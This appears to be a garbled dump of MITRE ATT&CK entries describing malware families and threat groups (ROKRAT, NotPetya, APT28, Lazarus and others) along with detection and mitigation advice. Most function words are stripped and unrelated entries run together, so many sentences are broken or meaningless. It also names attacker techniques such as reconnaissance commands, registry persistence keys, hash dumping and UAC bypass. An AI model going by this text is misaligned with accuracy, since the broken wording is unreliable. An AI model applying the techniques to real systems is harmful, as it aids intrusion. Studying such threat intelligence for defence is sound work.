Intego’s security solution mac.(Citation: Securelist Calisto July 2018) Windows event logs, ex. Event 524 indicating catalog deleted, entries suspicious activity. [Kwampirs](https://attack.mitre.org/software/S0236) collects network adapter interface commands <code>ipconfig /all</code>, <code>arp -a</code> <code>route print</code>. collects system's MAC address <code>getmac</code> domain configuration <code>net config workstation</code>.(Citation: Symantec Orangeworm April 2018) [Rising Sun](https://attack.mitre.org/software/S0448) enumerate files infected system, including file size, attributes, creation time, access time, write time. [Rising Sun](https://attack.mitre.org/software/S0448) enumerate compilation timestamp Windows executable files.(Citation: McAfee Sharpshooter December 2018)	 Monitor newly constructed network connections received untrusted hosts.  [SDelete](https://attack.mitre.org/software/S0195) deletes data unrecoverable.(Citation: SDelete July 2016) [Cobalt Group](https://attack.mitre.org/groups/G0080) Plink utility create SSH tunnels.(Citation: IB Cobalt Aug 2017) Monitor hash dumpers Security Accounts Manager (SAM) local file (<code>%SystemRoot%/system32/config/SAM</code>). hash dumpers local file device parse SAM table avoid file access defenses. in-memory SAM table reading hashes. Detection compromised ( LinkById: T1078) in-use adversaries well. documented method defenders identify behaviors reduce encryption key space. Detection efforts focused closely adversary behaviors, Modify Image Network Device CLI. detection methods require vendor support aid investigation. [SeaDuke](https://attack.mitre.org/software/S0053) capable persisting .lnk file stored Startup directory.(Citation: Unit 42 SeaDuke 2015) (Citation: PWC Cloud Hopper Technical Annex April 2017) [ROKRAT](https://attack.mitre.org/software/S0240) gather hostname OS version ensure doesn’t Windows XP Windows Server 2003 systems.(Citation: Talos ROKRAT)(Citation: Talos ROKRAT 2)(Citation: Securelist ScarCruft 2019)(Citation: NCCGroup RokRat Nov 2018)(Citation: Volexity InkySquid RokRAT August 2021)(Citation: Malwarebytes RokRAT VBA January 2021) [MobileOrder](https://attack.mitre.org/software/S0079) communicates C2 server TCP port 3728.(Citation: Scarlet Mimic Jan 2016) Monitor unexpected files .pdf, .docx, .jpg, etc.) viewed collecting internal data. Monitor requests ticket granting ticket service tickets Domain Controller. Event 4769 generated Domain Controller golden ticket KRBTGT password reset twice, mentioned mitigation section. status code 0x1F action failed "Integrity check decrypted field failed" misuse invalidated golden ticket.(Citation: CERT-EU Golden Ticket Protection) Monitor newly constructed processes match existing service executables.  [Avaddon](https://attack.mitre.org/software/S0640) registry persistence.(Citation: Arxiv Avaddon Feb 2021) [SideCopy](https://attack.mitre.org/groups/G1008) crafted generic lures spam campaigns collect emails credentials targeting efforts.(Citation: MalwareBytes SideCopy Dec 2021) [NotPetya](https://attack.mitre.org/software/S0368) <code>rundll32.exe</code> install remote systems accessed [PsExec](https://attack.mitre.org/software/S0029) <code>wmic</code>.(Citation: Talos Nyetya June 2017) (Citation: XAgentOSX 2017)(Citation: Symantec APT28 Oct 2018)(Citation: District Court Indictment GRU Oct 2018) [SynAck](https://attack.mitre.org/software/S0242) lists keyboard layouts installed victim’s <code>GetKeyboardLayoutList</code> API checks hardcoded language code list. match found, SynAck sleeps 300 exits encrypting files.(Citation: SecureList SynAck Doppelgänging 2018)  [SilverTerrier](https://attack.mitre.org/groups/G0083) FTP C2 communications.(Citation: Unit42 SilverTerrier 2018)	 Set account lockout policies failed login attempts prevent passwords guessed. strict policy create denial service condition render environments un-usable, accounts brute force locked-out. [Earth Lusca](https://attack.mitre.org/groups/G1006) spearphishing emails potential targets contained malicious link.(Citation: TrendMicro EarthLusca 2022) [Micropsia](https://attack.mitre.org/software/S0339) perform microphone recording.(Citation: Radware Micropsia July 2018) [Bazar](https://attack.mitre.org/software/S0534) create scheduled task persistence.(Citation: Cybereason Bazar July 2020)(Citation: NCC Team9 June 2020) Outlook methods, blocking macros ineffective Visual Basic engine features separate macro scripting engine.(Citation: SensePost Outlook Forms) released patches address issue. Ensure KB3191938 blocks Outlook Visual Basic displays malicious code warning, KB4011091 disables custom forms default, KB4011162 removes legacy feature, applied systems.(Citation: SensePost Outlook Page) [MURKYTOP](https://attack.mitre.org/software/S0233) capability retrieve shares remote hosts.(Citation: FireEye Periscope March 2018) [RDAT](https://attack.mitre.org/software/S0495) exfiltrate data gathered infected established Exchange Services API C2 channel.(Citation: Unit42 RDAT July 2020) [HALFBAKED](https://attack.mitre.org/software/S0151) delete file.(Citation: FireEye FIN7 April 2017) [APT37](https://attack.mitre.org/groups/G0067) delivers malware spearphishing emails malicious HWP attachments.(Citation: FireEye APT37 Feb 2018)(Citation: Talos Group123)(Citation: Securelist ScarCruft 2019) (Citation: CISA AppleJeus Feb 2021) [Epic](https://attack.mitre.org/software/S0091) <code>tasklist /svc</code> command list services system.(Citation: Kaspersky Turla) Monitor files write overwrite files network shared directory suspicious. [DanBot](https://attack.mitre.org/software/S1014) VBA macro decode payload prior installation execution.(Citation: SecureWorks August 2019) [APT1](https://attack.mitre.org/groups/G0006) commands <code>net localgroup</code>,<code>net user</code>, <code>net group</code> accounts system.(Citation: Mandiant APT1) [BitPaymer](https://attack.mitre.org/software/S0570) enumerate existing Windows services host configured LocalSystem.(Citation: Crowdstrike Indrik November 2018) [CosmicDuke](https://attack.mitre.org/software/S0050) collects Windows account hashes.(Citation: F-Secure Dukes) [Darkhotel](https://attack.mitre.org/groups/G0012) establish persistence adding programs Registry key.(Citation: Kaspersky Darkhotel) [Mythic](https://attack.mitre.org/software/S0699) SOCKS proxies tunnel traffic protocol.(Citation: Mythc Documentation) [GuLoader](https://attack.mitre.org/software/S0561) establish persistence Registry <code>HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce</code>.(Citation: Unit 42 NETWIRE April 2020) Disable RDP service unnecessary. [HermeticWiper](https://attack.mitre.org/software/S0697) ability overwrite file random bites.(Citation: Crowdstrike DriveSlayer February 2022)(Citation: ESET Hermetic Wizard March 2022) Destover-like implant [Lazarus Group](https://attack.mitre.org/groups/G0032) current time send C2 server.(Citation: McAfee GhostSecret) [APT38](https://attack.mitre.org/groups/G0082) DYEPACK create, delete, alter records databases SWIFT transactions.(Citation: FireEye APT38 Oct 2018) [SPACESHIP](https://attack.mitre.org/software/S0035) identifies files directories collection searching specific file extensions file modification time.(Citation: FireEye APT30) Monitor newly executed processes  Similarly, ensuring <code>tty_tickets</code> setting enabled prevent leakage tty sessions. Follow practices restricting access privileged accounts avoid hostile programs accessing sensitive information. [HOPLIGHT](https://attack.mitre.org/software/S0376) modified firewall [netsh](https://attack.mitre.org/software/S0108).(Citation: US-CERT HOPLIGHT Apr 2019)	 [KGH_SPY](https://attack.mitre.org/software/S0526) collect credentials Windows Credential Manager.(Citation: Cybereason Kimsuky November 2020) [Kevin](https://attack.mitre.org/software/S1020) renamed image `cmd.exe` random `.tmpl` extension.(Citation: Kaspersky Lyceum October 2021) [POWERSOURCE](https://attack.mitre.org/software/S0145) observed download [TEXTMATE](https://attack.mitre.org/software/S0146) Cobalt Strike Beacon payload victims.(Citation: FireEye FIN7 March 2017) [WarzoneRAT](https://attack.mitre.org/software/S0670) install template injection malicious DLL embedded template RTF Word document.(Citation: Uptycs Confucius APT Jan 2021) Monitor unexpected files .pdf, .docx, .jpg, etc.)  interacting network shares. [APT28](https://attack.mitre.org/groups/G0007) Office persistence mechanism Office adding Registry key <code>HKCU\Software\Microsoft\Office test\Special\Perf</code> execute code.(Citation: Palo Alto Office Sofacy) [Industroyer](https://attack.mitre.org/software/S0604) collects victim machine’s Windows GUID.(Citation: Dragos Crashoverride 2017) [HOPLIGHT](https://attack.mitre.org/software/S0376) observed collecting time victim machines.(Citation: US-CERT HOPLIGHT Apr 2019) [MuddyWater](https://attack.mitre.org/groups/G0069) attempted users enable macros launch malicious Word documents delivered spearphishing emails.(Citation: Unit 42 MuddyWater Nov 2017)(Citation: FireEye MuddyWater Mar 2018)(Citation: Securelist MuddyWater Oct 2018)(Citation: Talos MuddyWater 2019)(Citation: ClearSky MuddyWater June 2019)(Citation: Reaqta MuddyWater November 2017)(Citation: Anomali Static Kitten February 2021)(Citation: Trend Micro Muddy Water March 2021)(Citation: DHS CISA AA22-055A MuddyWater February 2022)(Citation: Talos MuddyWater Jan 2022)	  [Stuxnet](https://attack.mitre.org/software/S0603) digitally signed driver compromised Realtek certificate.(Citation: Symantec W.32 Stuxnet Dossier) [S-Type](https://attack.mitre.org/software/S0085) create .lnk file saved Start menu folder. create Registry key <code>HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\ IMJPMIJ8.1{3 characters Unique Identifier}</code>.(Citation: Cylance Dust Storm) technique easily mitigated preventive controls based behaviors performed scope enterprise defenses controls. [Grandoreiro](https://attack.mitre.org/software/S0531) execute <code>WinExec</code> API.(Citation: ESET Grandoreiro April 2020) [Dragonfly](https://attack.mitre.org/groups/G0035) conducted SQL injection attacks, exploited vulnerabilities CVE-2019-19781 CVE-2020-0688 Citrix Exchange, CVE-2018-13379 Fortinet VPNs.(Citation: CISA AA20-296A Berserk Bear December 2020) Monitor cloud logs API calls unusual activity snapshot enumeration. Discovery techniques occur operation adversary learns environment. Data events viewed isolation, chain behavior lead activities, Collection Exfiltration, based obtained. [Flagpro](https://attack.mitre.org/software/S0696) Native API enable obfuscation including `GetLastError` `GetTickCount`.(Citation: NTT Security Flagpro December 2021) [HotCroissant](https://attack.mitre.org/software/S0431) retrieve list applications <code>SOFTWARE\Microsoft\Windows\CurrentVersion\App Paths</code> registry key.(Citation: Carbon Black HotCroissant April 2020) [POWRUNER](https://attack.mitre.org/software/S0184) query Registry running <code>reg query</code> victim.(Citation: FireEye APT34 Dec 2017) Establish centralized logging instance activity, monitor review events reverting snapshot, rolling changes, changing persistence/type storage. Monitor events deactivation instances occurring planned operations. reduce false positives, valid change management procedures introduce identifier logged change tag header) supported cloud provider, distinguish valid, expected actions malicious ones. [OSInfo](https://attack.mitre.org/software/S0165) discovers shares network(Citation: Symantec Buckeye) [Remexi](https://attack.mitre.org/software/S0375) AutoIt VBS scripts execution process.(Citation: Securelist Remexi Jan 2019) [Magic Hound](https://attack.mitre.org/groups/G0059) acquired mobile phone potential targets, mobile malware additional phishing operations.(Citation: Proofpoint TA453 July2021) [ZxxZ](https://attack.mitre.org/software/S1013) distributed spearphishing emails, malicious RTF Excel attachment.(Citation: Cisco Talos Bitter Bangladesh 2022) [PingPull](https://attack.mitre.org/software/S1031) decrypt received data C2 server AES.(Citation: Unit 42 PingPull Jun 2022) [Penquin](https://attack.mitre.org/software/S0587) command code <code>do_vslist</code> send file names, size, status C2.(Citation: Leonardo Turla Penquin 2020) [Earth Lusca](https://attack.mitre.org/groups/G1006) WinRAR compress stolen files archive prior exfiltration.(Citation: TrendMicro EarthLusca 2022) Ensure externally facing servers patched regularly prevent adversary access [Exploitation Privilege Escalation](https://attack.mitre.org/techniques/T1068) gain remote code access file inclusion weaknesses adversaries upload files scripts automatically served pages. [RawPOS](https://attack.mitre.org/software/S0169) installs service maintain persistence.(Citation: Kroll RawPOS Jan 2017)(Citation: TrendMicro RawPOS April 2015)(Citation: Mandiant FIN5 GrrCON Oct 2016) [Carbanak](https://attack.mitre.org/software/S0030) command delete files.(Citation: FireEye CARBANAK June 2017) Monitor access files directories cryptographic certificates detecting access patterns collection exfiltration activity.  [SDBbot](https://attack.mitre.org/software/S0461) enumerate list running processes compromised machine.(Citation: Korean FSI TA505 2020) [Machete](https://attack.mitre.org/software/S0409) produces file listings search files exfiltrated.(Citation: ESET Machete July 2019)(Citation: Cylance Machete Mar 2017)(Citation: 360 Machete Sep 2020) [Pillowmint](https://attack.mitre.org/software/S0517) deleted filepath <code>%APPDATA%\Intel\devmonsrv.exe</code>.(Citation: Trustwave Pillowmint June 2020) Monitor executed commands arguments abuse task scheduling functionality facilitate initial recurring execution malicious code. [HOPLIGHT](https://attack.mitre.org/software/S0376) injected running processes.(Citation: US-CERT HOPLIGHT Apr 2019)	 [Leviathan](https://attack.mitre.org/groups/G0065) relies shells initial foothold persistence victim's systems.(Citation: FireEye APT40 March 2019)(Citation: CISA AA21-200A APT40 July 2021) (Citation: Forcepoint Monsoon) [FunnyDream](https://attack.mitre.org/software/S1044) send compressed obfuscated packets C2.(Citation: Bitdefender FunnyDream Campaign November 2020) [Hi-Zor](https://attack.mitre.org/software/S0087) XOR techniques obfuscate components.(Citation: Fidelis INOCNATION) [Kinsing](https://attack.mitre.org/software/S0599) executed Ubuntu container entry runs scripts.(Citation: Aqua Kinsing April 2020) [TYPEFRAME](https://attack.mitre.org/software/S0263) gather disk volume information.(Citation: US-CERT TYPEFRAME June 2018) [PowGoop](https://attack.mitre.org/software/S1046) DLL named Goopdate.dll impersonate legitimate Google update file.(Citation: DHS CISA AA22-055A MuddyWater February 2022) [TeamTNT](https://attack.mitre.org/groups/G0139) IRC bot C2 communications.(Citation: Trend Micro TeamTNT) [AppleSeed](https://attack.mitre.org/software/S0622) screenshots compromised host calling series APIs.(Citation: Malwarebytes Kimsuky June 2021)(Citation: KISA Operation Muzabi) (Citation: Kaspersky Turla) [Bumblebee](https://attack.mitre.org/software/S1039) relied user ISO file enable execution malicious shortcut files DLLs.(Citation: Proofpoint Bumblebee April 2022)(Citation: Symantec Bumblebee June 2022)(Citation: Cybereason Bumblebee August 2022)(Citation: Medium Ali Salem Bumblebee April 2022)
 (Citation: Kaspersky Carbanak) [WindTail](https://attack.mitre.org/software/S0466) ability receive execute self-delete command.(Citation: objective-see windtail2 jan 2019) [AADInternals](https://attack.mitre.org/software/S0677) dump secrets Local Security Authority.(Citation: AADInternals Documentation) Ensure permission level service binaries replaced modified users permission level. [Ramsay](https://attack.mitre.org/software/S0458) <code>ImprovedReflectiveDLLInjection</code> deploy components.(Citation: Eset Ramsay 2020)  [HAFNIUM](https://attack.mitre.org/groups/G0125) stolen copies Active Directory database (NTDS.DIT).(Citation: Volexity Exchange Marauder March 2021) [KOCTOPUS](https://attack.mitre.org/software/S0669) perform UAC bypass fodhelper.exe eventvwr.exe.(Citation: MalwareBytes LazyScripter Feb 2021) [ThiefQuest](https://attack.mitre.org/software/S0595) API functions <code>NSCreateObjectFileImageFromMemory</code> load link in-memory payloads.(Citation: wardle evilquest partii) implementing disaster recovery plans procedures regular data backups restore organizational data.(Citation: Ready.gov DRP) Ensure backups stored protected common methods adversaries gain access destroy backups prevent recovery. [Remsec](https://attack.mitre.org/software/S0125) current user.(Citation: Kaspersky ProjectSauron Technical Analysis) [POORAIM](https://attack.mitre.org/software/S0216) AOL Instant Messenger C2.(Citation: FireEye APT37 Feb 2018) [ROKRAT](https://attack.mitre.org/software/S0240)  `GetForegroundWindow` `GetWindowText` APIs discover user typing.(Citation: Talos ROKRAT) (Citation: FireEye APT41 Aug 2019) [Pandora](https://attack.mitre.org/software/S0664) CVE-2017-15303 disable Windows Driver Signature Enforcement (DSE) protection load driver.(Citation: Trend Micro Iron Tiger April 2021) Monitor unexpected deletion file manipulate external outcomes hide activity  [HiddenWasp](https://attack.mitre.org/software/S0394) encrypts configuration payload.(Citation: Intezer HiddenWasp Map 2019) (Citation: Trend Micro Waterbear December 2019) [Ke3chang](https://attack.mitre.org/groups/G0004) credential dumpers stealers legitimate credentials, gain access victim accounts.(Citation: NICKEL December 2021) [Naikon](https://attack.mitre.org/groups/G0019) convinced victims malicious attachments execute malware.(Citation: CheckPoint Naikon 2020) [APT33](https://attack.mitre.org/groups/G0064) deployed tool [DarkComet](https://attack.mitre.org/software/S0334) Startup folder victim, Registry gain persistence.(Citation: Symantec Elfin Mar 2019)(Citation: Holmium June 2020) [TSCookie](https://attack.mitre.org/software/S0436) executed malicious links embedded e-mails spoofing Ministries Education, Culture, Sports, Science Technology Japan.(Citation: JPCert TSCookie March 2018) [BADNEWS](https://attack.mitre.org/software/S0128) command download .exe execute CreateProcess API. ShellExecute.(Citation: Forcepoint Monsoon)(Citation: TrendMicro Patchwork Dec 2017) Limit privileges user accounts authorized administrators interact service service configurations.  [Patchwork](https://attack.mitre.org/groups/G0040) bypassed User Access Control (UAC).(Citation: Cymmetria Patchwork) [Pupy](https://attack.mitre.org/software/S0192) list SIDs provide option selecting process tokens impersonate.(Citation: GitHub Pupy) Monitor network data uncommon data flows client sending data receives server). Processes utilizing network network communication suspicious. Analyze packet contents detect communications follow expected protocol behavior port used. [BitPaymer](https://attack.mitre.org/software/S0570) enumerate sessions user logged infected host.(Citation: Crowdstrike Indrik November 2018) [LAPSUS$](https://attack.mitre.org/groups/G1004) Windows built-in tool `ntdsutil` extract Active Directory (AD) database.(Citation: MSTIC DEV-0537 Mar 2022) [Chimera](https://attack.mitre.org/groups/G0114) exfiltrated stolen data OneDrive accounts.(Citation: NCC Chimera January 2021) [Ecipekac](https://attack.mitre.org/software/S0624) abuse legitimate application policytool.exe load malicious DLL.(Citation: Securelist APT10 March 2021) [Zeus Panda](https://attack.mitre.org/software/S0330) checks existence Registry key values.(Citation: GDATA Zeus Panda June 2017) Monitor newly constructed network connections attempt exfiltrate data network medium command control channel. Processes utilizing network network communication suspicious. [ROKRAT](https://attack.mitre.org/software/S0240) collect host data specific file types.(Citation: NCCGroup RokRat Nov 2018)(Citation: Volexity InkySquid RokRAT August 2021)(Citation: Malwarebytes RokRAT VBA January 2021) [MarkiRAT](https://attack.mitre.org/software/S0652) check Telegram installation directory enumerating files disk.(Citation: Kaspersky Ferocious Kitten Jun 2021) [BADFLICK](https://attack.mitre.org/software/S0642) decode shellcode custom rotating XOR cipher.(Citation: Accenture MUDCARP March 2019) Monitor suspicious programs execution services. processes outlier processes compared historical data. Monitor unexpected deletion command history file, ConsoleHost_history.txt, ~/.zsh_history, ~/.bash_history. [APT19](https://attack.mitre.org/groups/G0073) malware variant Base64 encode communications C2 server.(Citation: Unit 42 C0d0so0 Jan 2016) Monitor logs sources command execution history actions gather accounts, including calls cloud APIs perform account discovery.

System network discovery techniques occur operation adversary learns environment, extent normal network operations. discovery data events viewed isolation, chain behavior lead activities, Lateral Movement, based obtained. [BLUELIGHT](https://attack.mitre.org/software/S0657) collect local time compromised host.(Citation: Volexity InkySquid BLUELIGHT August 2021) [MuddyWater](https://attack.mitre.org/groups/G0069) malware collect victim’s username.(Citation: Securelist MuddyWater Oct 2018)(Citation: Trend Micro Muddy Water March 2021) Monitor scheduled jobs attempt remove artifacts host system. (Citation: Kaspersky ThreatNeedle Feb 2021) [Pupy](https://attack.mitre.org/software/S0192) compress data Zip sending C2.(Citation: GitHub Pupy) monitoring social media activity organization. Suspicious activity include personas claiming organization modified accounts numerous connection requests accounts affiliated organization.
Detection efforts focused stages adversary lifecycle, Initial Access (ex: [Spearphishing Service](https://attack.mitre.org/techniques/T1566/003)). [BoomBox](https://attack.mitre.org/software/S0635) enumerate username compromised host.(Citation: MSTIC Nobelium Toolset 2021) [TrickBot](https://attack.mitre.org/software/S0266) collects list install programs services system’s machine.(Citation: S2 Grupo TrickBot June 2017) Refer NIST guidelines creating password policies.(Citation: NIST 800-63-3) variant [Emissary](https://attack.mitre.org/software/S0082) appends junk data DLL file create file exceed maximum size anti-virus programs scan.(Citation: Emissary Trojan Feb 2016) [StoneDrill](https://attack.mitre.org/software/S0380) wipe accessible physical logical drives infected machine.(Citation: Symantec Elfin Mar 2019)	 Monitor attempts access stored Registry certificates private keys. example, user certificates commonly stored `HKEY_CURRENT_USER\SOFTWARE\Microsoft\SystemCertificates`.(Citation: SpecterOps Certified Pre Owned)(Citation: O365 Blog Azure Device IDs) [InvisiMole](https://attack.mitre.org/software/S0260) remotely activate victim’s webcam capture content.(Citation: ESET InvisiMole June 2018)(Citation: ESET InvisiMole June 2020) [Crutch](https://attack.mitre.org/software/S0538) hardcoded GitHub repository fallback channel.(Citation: ESET Crutch December 2020) [BRONZE BUTLER](https://attack.mitre.org/groups/G0060) batch script adds Registry key establish malware persistence.(Citation: Secureworks BRONZE BUTLER Oct 2017) [APT38](https://attack.mitre.org/groups/G0082) collected data compromised host.(Citation: CISA AA20-239A BeagleBoyz August 2020) [UNC2452](https://attack.mitre.org/groups/G0118) compromised identities access VPNs remote access tools.(Citation: MSTIC NOBELIUM Mar 2021) [TYPEFRAME](https://attack.mitre.org/software/S0263) ports 443, 8080, 8443 FakeTLS method.(Citation: US-CERT TYPEFRAME June 2018) [ShadowPad](https://attack.mitre.org/software/S0596) discovered including memory status, CPU frequency, OS versions, volume serial numbers.(Citation: Kaspersky ShadowPad Aug 2017) [Gazer](https://attack.mitre.org/software/S0168) obtains current user's security identifier.(Citation: Securelist WhiteBear Aug 2017) [ZIRCONIUM](https://attack.mitre.org/groups/G0128) msiexec.exe command-line utility download execute malicious MSI files.(Citation: Zscaler APT31 Covid-19 October 2020) [FIN6](https://attack.mitre.org/groups/G0037) Stealer credential stealer target e-mail file transfer utilities including FTP.(Citation: Visa FIN6 Feb 2019) [DarkWatchman](https://attack.mitre.org/software/S0673) <code>csc.exe</code> tool compile C# executable.(Citation: Prevailion DarkWatchman 2021)  [JPIN](https://attack.mitre.org/software/S0201) encrypted compressed payload disguised bitmap resource installer.(Citation: PLATINUM April 2016) (Citation: Trend Micro DRBControl February 2020)(Citation: Profero APT27 December 2020)(Citation: Trend Micro Iron Tiger April 2021) (Citation: Symantec Elfin Mar 2019) [Calisto](https://attack.mitre.org/software/S0274) collects Keychain storage data copies passwords/tokens file.(Citation: Securelist Calisto July 2018)(Citation: Symantec Calisto July 2018) [Donut](https://attack.mitre.org/software/S0695) patch Antimalware Scan Interface (AMSI), Windows Lockdown Policy (WLDP), exit-related [Native API](https://attack.mitre.org/techniques/T1106) functions avoid process termination.(Citation: Donut Github)	 [GuLoader](https://attack.mitre.org/software/S0561) ability perform anti-debugging based time checks, API calls, CPUID.(Citation: Medium Eli Salem GuLoader April 2021) [ThiefQuest](https://attack.mitre.org/software/S0595) <code>kill_unwanted</code> function list running processes, compares process encrypted list “unwanted” security programs, kills processes security programs.(Citation: wardle evilquest parti) [STARWHALE](https://attack.mitre.org/software/S1037) ability execute commands `cmd.exe`.(Citation: Mandiant UNC3313 Feb 2022) (Citation: Moran 2014) [MailSniper](https://attack.mitre.org/software/S0413) account names Exchange Office 365 <code>Get-GlobalAddressList</code> cmdlet.(Citation: Black Hills Attacking Exchange MailSniper, 2016) [Strider](https://attack.mitre.org/groups/G0041) hidden file stored file disk.(Citation: Kaspersky ProjectSauron Report) [Matryoshka](https://attack.mitre.org/software/S0167) establish persistence adding Scheduled Task named "Microsoft Boost Kernel Optimization".(Citation: ClearSky Wilted Tulip July 2017)(Citation: CopyKittens Nov 2015) [Stuxnet](https://attack.mitre.org/software/S0603) enumerates directories network resource.(Citation: Symantec W.32 Stuxnet Dossier) [Rclone](https://attack.mitre.org/software/S1040) compress files `gzip` prior exfiltration.(Citation: Rclone) [POORAIM](https://attack.mitre.org/software/S0216) enumerate processes.(Citation: FireEye APT37 Feb 2018) [FIN4](https://attack.mitre.org/groups/G0085) POST requests transmit data.(Citation: FireEye Hacking FIN4 Dec 2014)(Citation: FireEye Hacking FIN4 Video Dec 2014) (Citation: ESET Sednit 3) (Citation: Proofpoint Leviathan Oct 2017)(Citation: CISA AA21-200A APT40 July 2021) Monitor usage unexpected unusual cookies access resources services. Forged cookies unknown accounts result compromised secrets passwords [Private Keys](https://attack.mitre.org/techniques/T1552/004). Monitor executed commands arguments gather victim's business relationships targeting. Detecting guardrails difficult depending implementation. [Chimera](https://attack.mitre.org/groups/G0114) Windows version Linux <code>touch</code> command modify time stamp DLLs.(Citation: NCC Chimera January 2021) [GRIFFON](https://attack.mitre.org/software/S0417) <code>sctasks</code> persistence. (Citation: SecureList Griffon 2019) [ComRAT](https://attack.mitre.org/software/S0126) embedded XOR encrypted communications module orchestrator module.(Citation: ESET ComRAT 2020)(Citation: CISA ComRAT Oct 2020)  [APT3](https://attack.mitre.org/groups/G0022) enables Remote Desktop Protocol persistence.(Citation: aptsim) [APT3](https://attack.mitre.org/groups/G0022) interacted compromised systems browse files RDP sessions.(Citation: Twitter Cglyer Status Update APT3 eml) [Deep Panda](https://attack.mitre.org/groups/G0009) utilize WMI lateral movement.(Citation: Alperovitch 2014) [Daserf](https://attack.mitre.org/software/S0187) file folder names legitimate programs blend in, HP, Intel, Adobe, perflogs.(Citation: Symantec Tick Apr 2016) [Lazarus Group](https://attack.mitre.org/groups/G0032) scheduled task named `SRCheck` mask execution malicious .dll.(Citation: ESET Twitter Ida Pro Nov 2021) [FunnyDream](https://attack.mitre.org/software/S1044) compressed collected files zLib encrypted XOR operation string key command `qwerasdf` command argument doesn’t key. File names obfuscated XOR key compressed file content.(Citation: Bitdefender FunnyDream Campaign November 2020) (Citation: Symantec Leafminer July 2018) Monitor file creation files named partial directories locations searched common processes environment variable, user writable. Also, monitor file creation programs named Windows programs programs commonly executed path (such "findstr," "net," "python"). activity occurs administration activity, upgrades, installations, patches, suspicious. [NETWIRE](https://attack.mitre.org/software/S0198) collect IP address compromised host.(Citation: Red Canary NETWIRE January 2020)(Citation: Proofpoint NETWIRE December 2020) Monitor newly constructed files written disk gain access user visiting normal browsing. Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)).  [Grandoreiro](https://attack.mitre.org/software/S0531) DGA hiding C2 addresses, including algorithm user-specific key daily.(Citation: Securelist Brazilian Banking Malware July 2020)(Citation: ESET Grandoreiro April 2020) automatically relaunching forwarding mechanisms recurring intervals (ex: temporal, on-logon, etc.) applying change management firewall rules configurations. Organizations weighing risk storing credentials browsers. browser credential disclosure concern, technical controls, policy, user training prevent storage credentials browsers. [Daserf](https://attack.mitre.org/software/S0187) log keystrokes.(Citation: Trend Micro Daserf Nov 2017)(Citation: Secureworks BRONZE BUTLER Oct 2017) [PipeMon](https://attack.mitre.org/software/S0501) decrypt password-protected executables.(Citation: ESET PipeMon 2020) (Citation: FireEye APT33 Guardrail) [AppleSeed](https://attack.mitre.org/software/S0622) achieve execution users running malicious file attachments distributed email.(Citation: Malwarebytes Kimsuky June 2021) [Gazer](https://attack.mitre.org/software/S0168) stores configuration items alternate data streams (ADSs) Registry accessible.(Citation: ESET Gazer Aug 2017) Establish centralized logging instance activity, monitor review events reverting snapshot, rolling changes, changing persistence/type storage. Monitor events snapshots rollbacks VM configuration changes, occurring normal activity. reduce false positives, valid change management procedures introduce identifier logged change tag header) supported cloud provider, distinguish valid, expected actions malicious ones. Malicious XDG autostart entries detected auditing file modification events <code>/etc/xdg/autostart</code> <code>~/.config/autostart</code> directories. Depending individual configurations, defenders query environment variables <code>$XDG_CONFIG_HOME</code> <code>$XDG_CONFIG_DIRS</code> determine paths Autostart entries. Autostart entry files legitimate packages considered suspicious. Suspicious entries identified comparing entries trusted baseline. [TAINTEDSCRIBE](https://attack.mitre.org/software/S0586) randomly pick hard-coded IP addresses C2 communication; IP fails, wait 60 IP address.(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE 2020) [Backdoor.Oldrea](https://attack.mitre.org/software/S0093) collects current username victim.(Citation: Symantec Dragonfly) Monitor analyze traffic patterns packet inspection protocol(s) follow expected protocol standards traffic flows (e.g extraneous packets belong established flows, gratuitous anomalous traffic patterns, anomalous syntax, structure). correlation process monitoring command detect anomalous processes execution command arguments traffic patterns (e.g. monitor anomalies files initiate connections respective protocol(s)). [Sidewinder](https://attack.mitre.org/groups/G0121) lured targets malicious links gain execution target environment.(Citation: ATT Sidewinder January 2021)(Citation: Rewterz Sidewinder APT April 2020)(Citation: Rewterz Sidewinder COVID-19 June 2020)(Citation: Cyble Sidewinder September 2020) [ShimRat](https://attack.mitre.org/software/S0444) enumerate connected drives infected host machines.(Citation: FOX-IT 2016 Mofang) [Dragonfly](https://attack.mitre.org/groups/G0035) identified browsed file servers victim network, , viewing files pertaining ICS Supervisory Control Data Acquisition (SCADA) systems.(Citation: US-CERT TA18-074A) Monitor process API calls <code>AddPrintProcessor</code> <code>GetPrintProcessorDirectory</code>. [Epic](https://attack.mitre.org/software/S0091) searches anti-malware services running victim’s machine terminates them.(Citation: Kaspersky Turla) creating service persistence, [TDTESS](https://attack.mitre.org/software/S0164) sets file creation time service creation time victim's legitimate svchost.exe file.(Citation: ClearSky Wilted Tulip July 2017) (Citation: Palo Alto Sofacy 06-2018)(Citation: Unit42 Cannon Nov 2018)(Citation: Securelist Sofacy Feb 2018)(Citation: Unit42 Sofacy Dec 2018)(Citation: ESET Zebrocy 2019) [Shamoon](https://attack.mitre.org/software/S0140) reboot infected wiping functionality completed.(Citation: Unit 42 Shamoon3 2018)(Citation: McAfee Shamoon December 2018)	 [Gamaredon Group](https://attack.mitre.org/groups/G0047) tools contained application check performance USB flash drives. [Gamaredon Group](https://attack.mitre.org/groups/G0047) malware scan removable drives.(Citation: Palo Alto Gamaredon Feb 2017)(Citation: ESET Gamaredon June 2020) [Ebury](https://attack.mitre.org/software/S0377) injected dynamic library descendent processes sshd LD_PRELOAD.(Citation: ESET Ebury Oct 2017) Monitor queried domain (DNS) registry data purchased domains targeting. Reputation/category-based detection difficult categorization updated. Detection efforts focused stages adversary lifecycle, Initial Access Command Control. Monitor third-party application logging, messaging, artifacts abuse transport agents establish persistent access systems. monitoring application logs abnormal behavior suspicious installation application software components. [CookieMiner](https://attack.mitre.org/software/S0492) base64 encoding obfuscate scripts system.(Citation: Unit42 CookieMiner Jan 2019)  [APT41](https://attack.mitre.org/groups/G0096) [BITSAdmin](https://attack.mitre.org/software/S0190) download install payloads.(Citation: FireEye APT41 March 2020)(Citation: Crowdstrike GTR2020 Mar 2020) [XTunnel](https://attack.mitre.org/software/S0117) relays traffic C2 server victim.(Citation: Crowdstrike DNC June 2016) [Fox Kitten](https://attack.mitre.org/groups/G0117) RDP log laterally target environment.(Citation: CISA AA20-259A Iran-Based Actor September 2020)(Citation: ClearSky Pay2Kitten December 2020) Restrict write 